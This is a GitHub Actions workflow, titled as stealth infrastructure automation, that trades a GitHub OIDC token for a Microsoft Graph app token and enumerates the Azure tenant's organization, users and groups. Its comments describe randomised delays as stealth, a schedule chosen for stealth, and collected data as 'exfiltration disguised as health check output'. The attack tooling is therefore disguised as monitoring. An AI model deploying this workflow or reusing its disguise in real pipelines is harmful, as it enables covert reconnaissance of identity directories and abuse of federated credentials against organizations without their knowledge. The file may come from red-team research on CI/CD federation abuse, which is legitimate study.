name: Infrastructure Automation (Stealth)
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */8 * * *'  # Every 8 hours for stealth

permissions:
  id-token: write
  contents: read

jobs:
  infrastructure-check:
    runs-on: ubuntu-latest
    steps:
      - name: Azure Infrastructure Assessment
        shell: pwsh
        env:
          APP_CLIENT_ID: ${{ secrets.APP_CLIENT_ID }}
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
        run: |
          Write-Host "Starting infrastructure health assessment..." -ForegroundColor Green
          
          # Acquire GitHub OIDC ID token (audience = APP_CLIENT_ID)
          $aud = [System.Uri]::EscapeDataString('api://AzureADTokenExchange')
          $oidcUrl = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud"
          $gh = Invoke-RestMethod -Headers @{ Authorization = "Bearer $($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN)" } -Uri $oidcUrl -Method GET
          $GitHubIdToken = $gh.value
          if(-not $GitHubIdToken){ throw 'Failed to obtain GitHub OIDC ID token' }
          Write-Host "✓ GitHub OIDC token acquired" -ForegroundColor Green

          # Exchange GitHub Id token for App token directly
          Write-Host "Authenticating with Azure services..." -ForegroundColor Cyan
          $kvp = @{
            client_id             = $env:APP_CLIENT_ID
            grant_type            = 'client_credentials'
            client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
            client_assertion      = $GitHubIdToken
            scope                 = 'https://graph.microsoft.com/.default'
          }
          $body = ($kvp.GetEnumerator() | ForEach-Object { '{0}={1}' -f [System.Uri]::EscapeDataString($_.Key), [System.Uri]::EscapeDataString([string]$_.Value) }) -join '&'
          $tokenResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:AZURE_TENANT_ID)/oauth2/v2.0/token" -Headers @{ Accept = 'application/json' } -ContentType 'application/x-www-form-urlencoded' -Body $body
          $appToken = $tokenResp.access_token
          if(-not $appToken){ throw 'App token request failed' }
          Write-Host "✓ App token acquired via direct GitHub FIC" -ForegroundColor Green

          # Step 2: Execute directory-wide operations (appears as monitoring)
          Write-Host "Performing directory health checks..." -ForegroundColor Cyan
          $headers = @{Authorization = "Bearer $appToken"}
          
          # Stealthy enumeration with delays
          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
          $org = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/organization'
          Write-Host "Organization: $($org.value[0].displayName)" -ForegroundColor White
          
          Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 45)
          $users = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/users?$top=5&$select=userPrincipalName,displayName'
          Write-Host "Sample users enumerated: $($users.value.Count)" -ForegroundColor White
          
          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
          $groups = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/groups?$top=3&$select=displayName'
          Write-Host "Security groups assessed: $($groups.value.Count)" -ForegroundColor White
          
          # Stealth exfiltration disguised as health check output
          $assessment = @{
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            tenant = $org.value[0].displayName
            userSample = $users.value.userPrincipalName
            groupSample = $groups.value.displayName
            status = "Infrastructure health check completed"
          }
          
          Write-Host "Assessment completed successfully" -ForegroundColor Green
          Write-Host "Trust chain: GitHub OIDC → App → Graph API" -ForegroundColor Magenta
